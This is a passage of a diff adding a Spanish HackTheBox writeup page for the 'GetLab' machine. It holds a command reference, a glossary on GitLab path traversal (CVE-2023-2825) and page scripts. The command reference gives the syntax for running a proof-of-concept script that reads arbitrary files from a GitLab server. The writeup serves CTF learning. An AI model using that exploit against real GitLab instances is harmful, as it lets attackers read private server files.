+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl salida.xml &gt; salida.html</div>
+          <div class="cmd-ref-desc">Transforma el XML de nmap en un informe HTML legible en el navegador.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → Hoja de estilo oficial que da formato al informe.</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">python3 -m venv</div>
+          <div class="cmd-ref-syntax">python3 -m venv venv &amp;&amp; source venv/bin/activate</div>
+          <div class="cmd-ref-desc">Crea un entorno Python aislado donde instalar dependencias sin tocar el sistema. Es la alternativa limpia a <code>--break-system-packages</code>.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-m venv</span> → Ejecuta el módulo que crea el entorno.</li>
+            <li><span>source venv/bin/activate</span> → Activa el entorno en la terminal actual.</li>
+            <li><span>pip install -r requirements.txt</span> → Instala las dependencias del PoC dentro del entorno.</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">cve_2023_2825.py</div>
+          <div class="cmd-ref-syntax">python3 cve_2023_2825.py --url &lt;URL&gt; --username &lt;u&gt; --password &lt;p&gt; --file &lt;ruta&gt;</div>
+          <div class="cmd-ref-desc">Explota el CVE-2023-2825 para leer un archivo del servidor. La primera vez crea la estructura; después se reutiliza.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>--url</span> → Dirección de la instancia de GitLab.</li>
+            <li><span>--username / --password</span> → Cuenta registrada en la instancia.</li>
+            <li><span>--file</span> → Archivo del servidor que queremos leer.</li>
+            <li><span>--reuse-path</span> → Ruta de subida ya creada, para no repetir el proceso.</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 06 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">GitLab</div>
+          <div class="glos-def">
+            Plataforma para alojar repositorios Git con wiki, incidencias e integración continua. Su edición <strong>Community</strong> es gratuita y autohospedable,
+            y está escrita en <strong>Ruby on Rails</strong>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2023-2825</div>
+          <div class="glos-def">
+            Vulnerabilidad de <strong>lectura arbitraria de archivos</strong> en GitLab CE/EE 16.0.0, causada por un path traversal en la ruta de los adjuntos.
+            Permite leer ficheros del servidor con los permisos del usuario que ejecuta GitLab.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Path traversal</div>
+          <div class="glos-def">
+            Técnica que usa secuencias como <code>../</code> para salir del directorio previsto y acceder a rutas arbitrarias del sistema de ficheros.
+            Es una de las vulnerabilidades más comunes en aplicaciones web con subida o lectura de archivos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Registro público (self-registration)</div>
+          <div class="glos-def">
+            Opción que permite crear cuentas sin invitación ni aprobación de un administrador. En esta máquina es la condición previa del exploit: sin cuenta,
+            el PoC no puede crear proyectos ni adjuntos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">PoC — Proof of Concept</div>
+          <div class="glos-def">
+            Código que demuestra que una vulnerabilidad es explotable. Antes de ejecutar un PoC ajeno contra cualquier objetivo conviene leerlo: decide qué peticiones envía y con qué datos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Entorno virtual (venv)</div>
+          <div class="glos-def">
+            Directorio con un intérprete de Python y sus propias dependencias, aislado del sistema. Es la práctica recomendada para instalar paquetes de un PoC
+            sin modificar el Python de Kali.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">PEP 668 — externally-managed-environment</div>
+          <div class="glos-def">
+            Marcador que impide a <code>pip</code> instalar paquetes en el Python gestionado por el sistema operativo. Kali lo aplica, por eso el error aparece al instalar sin entorno virtual.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">nginx</div>
+          <div class="glos-def">
+            Servidor web y proxy inverso. En esta máquina sirve GitLab en el puerto 80 y responde también en el 8060, según indica el escaneo.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="caving.html"><span class="dir">← ANTERIOR</span><span class="nombre">Caving</span></a><a class="siguiente" href="../facil/base.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Base</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="ransomnet.html"><span class="nombre">RansomNet</span><span class="meta">hackthebox · muy-facil · CVE · RCE</span></a><a class="rel-card" href="../facil/base.html"><span class="nombre">Base</span><span class="meta">hackthebox · facil · Web</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de GetLab · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "GETLAB", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/getlab.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
